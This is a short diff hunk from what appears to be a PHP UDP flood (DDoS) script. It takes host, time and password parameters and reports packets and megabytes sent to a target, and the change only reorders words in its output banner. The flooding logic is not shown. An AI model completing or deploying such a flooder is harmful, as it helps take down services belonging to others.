@@ -23,7 +23,7 @@ if(isset($_GET['host'])&&isset($_GET['time'])&&isset($_GET['pass'])){
         }
     }
     
-echo "<br><b>UDP DDoS Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
+echo "<br><b>DDoS UDP Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
 
 }else{ 
 //echo "Missing parameters." ;
